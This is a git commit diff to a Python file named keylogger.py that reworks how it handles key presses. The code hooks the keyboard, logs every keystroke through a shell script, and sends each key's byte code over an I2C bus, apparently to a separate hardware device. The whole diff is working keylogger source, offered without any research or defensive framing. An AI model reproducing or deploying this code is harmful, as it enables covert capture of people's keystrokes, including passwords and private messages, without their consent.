1653dcd2e2b157a8c79f1d01c2c315c7409b5471
xployt404 <101953958+xployt404@users.noreply.github.com>
2022-04-16 19:05:14 +0000

    made logging and sending faster
    also more simple code

--- keylogger.py
+++ keylogger.py
@@ -7,30 +7,25 @@ addr = 0x20 # bus address
 bus = SMBus(1) # indicates /dev/ic2-1
 pathtologSH=f"{os.getcwd()}/log.sh"
 
-# ASCII codes for modifier keys
+# ASCII codes for modifier and special keys
 modifiers={
-    "enter"     : (13,  None),
-    "space"     : (32,  " "),
+    #actual modifier keys
     "alt gr"    : (1,   None),
     "alt"       : (2,   None),
-    "ctrl"      : (128, None),
-    "shift"     : (15,  None),
-    "backspace" : (8,   None),
-    "delete"    : (127, None),
+    "ctrl"      : (3,   None),
+    "shift"     : (4,   None),
+    #just special keys
     "left"      : (17,  None),
     "right"     : (18,  None),
     "up"        : (19,  None),
     "down"      : (20,  None),
-    "caps lock" : (178, None),
-    "tab".      : (9,   None),
+    "backspace" : (8,   None),
+    "delete"    : (6,   None),
+    "enter"     : (13,  None),
+    "space"     : (32,   " "),
+    "caps lock" : (7,   None),
+    "tab"       : (9,   None)
 }
-
-# function that converts pressed letters to sendable ASCII values
-def ConvertStringToBytes(src):
-     converted = []
-     for i in f"{src}":
-         converted.append(ord(i))
-     return converted
 
 # start of permanent logging
 while True:
@@ -38,22 +33,21 @@ while True:
     name=event.name
     # only record if event is a press down
     if event.event_type == keyboard.KEY_DOWN:
+        try:
+            # this is to send certain bytes for the modifier keys
+            if len(name)>1:
+                bus.write_byte(addr, modifiers[name][0])
+            # if the key isnt a modifier key than e.g. normal letters
+            # it converts the text to bytes and sends it
+            else:
+                bus.write_byte(addr, ord(f"{event.name}"))
+        except Exception as e:
+            print("failure but still logged")
+
+
         if name == "space":
              subprocess.run(["/bin/sh", pathtologSH, " "])
-        elif name == "y":
-            subprocess.run(["/bin/sh", pathtologSH, "z"])
-        elif name == "z":
-            subprocess.run(["/bin/sh", pathtologSH, "y"])
         elif len(name) > 1:
             subprocess.run(["/bin/sh", pathtologSH, name.upper()])
         else:
             subprocess.run(["/bin/sh", pathtologSH, name])
-       # this is to send certain bytes for the modifier keys
-        if len(name)>1:
-            bus.write_byte(addr, modifiers[name][0])
-
-        # if the key isnt a modifier key than e.g. normal letters
-        # it converts the text to bytes and sends it
-        else:
-            for i in ConvertStringToBytes(event.name):
-                bus.write_byte(addr, i)
